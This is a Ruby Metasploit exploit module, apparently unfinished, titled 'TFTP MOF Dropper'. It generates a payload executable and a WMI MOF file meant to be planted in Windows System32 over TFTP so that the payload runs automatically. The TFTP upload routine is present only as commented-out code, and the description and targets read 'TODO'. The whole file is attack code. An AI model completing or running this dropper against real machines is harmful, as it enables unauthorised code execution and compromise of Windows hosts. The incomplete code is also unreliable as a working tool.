require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  #include Rex::Proto::TFTP

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'TFTP MOF Dropper',
      'Description'    => %q{
        TODO
      },
      'Author'         => [ 'cortex42' ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows TODO', {}]
        ],
      'DefaultTarget'  => 0
    ))
    register_options([
      OptAddress.new('RHOST',    [true, "The remote TFTP server"]),
      Opt::RPORT(69)
    ])
  end

  def exploit
    # Main function
    print_status("Generating payload and mof file...")

    exe_name = "#{rand_text_alpha(rand(5)+5)}.exe"
    exe_content = generate_payload_exe
    exe_local_path = "/tmp/#{exe_name}"
    File.write(exe_local_path, exe_content)
    print_status("Written exe to #{exe_local_path}")

    mof_name = "#{rand_text_alpha(rand(5)+5)}.mof"
    mof_content = generate_mof(mof_name, exe_name)
    mof_local_path = "/tmp/#{mof_name}"
    File.write(mof_local_path, mof_content)
    print_status("Written mof to #{mof_local_path}")

    #exe_path = "/Windows/System32/#{exe_name}"
    #upload_file(exe_path, exe_local_path)
    #upload_file(exe_path, "DATA:#{exe_content}")
    #sleep(6)

    #mof_path = "/Windows/System32/wbem/mof/#{mof_name}"
    #upload_file(mof_path, mof_local_path)
    #upload_file(mof_path, "DATA:#{mof_content}")
  end

# from metasploit tftp_transfer_util.rb
#def rport
#    datastore['RPORT'] || 69
#  end
#
#  def rhost
#    datastore['RHOST']
#  end
#
#  def lhost
#    datastore['LHOST'] || "0.0.0.0"
#  end
#
#  def lport
#    (1025 + rand(0xffff-1025))
#  end
#
#  def upload_file(remote_file, local_file)
#
#    tftp_client = Rex::Proto::TFTP::Client.new(
#      "LocalHost" => lhost,
#      "LocalPort" => lport,
#      "PeerHost" => rhost,
#      "PeerPort" => rport,
#      "LocalFile" => local_file,
#      "RemoteFile" => remote_file,
#      "Mode" => "octet",
#      "Context" => {'Msf' => self.framework, 'MsfExploit' => self},
#      "Action" => "upload"
#    )
#    print_status "Uploading..."
#    ret = tftp_client.send_write_request { |msg| print_tftp_status(msg) }
#
#    while not tftp_client.complete
#      select(nil,nil,nil,1)
#      print_status [rtarget,"TFTP transfer operation complete."].join
#      break
#    end
#  end
#
#  def rtarget(ip=nil)
#    if (ip or rhost) and rport
#      [(ip || rhost),rport].map {|x| x.to_s}.join(":") << " "
#    elsif (ip or rhost)
#      "#{rhost} "
#    else
#      ""
#    end
#  end
#
#  def print_tftp_status(msg)
#    case msg
#    when /Aborting/, /errors.$/
#      print_error [rtarget,msg].join
#    when /^WRQ accepted/, /^Sending/, /complete!$/
#      print_good [rtarget,msg].join
#    else
#      vprint_status [rtarget,msg].join
#    end
#  end
end
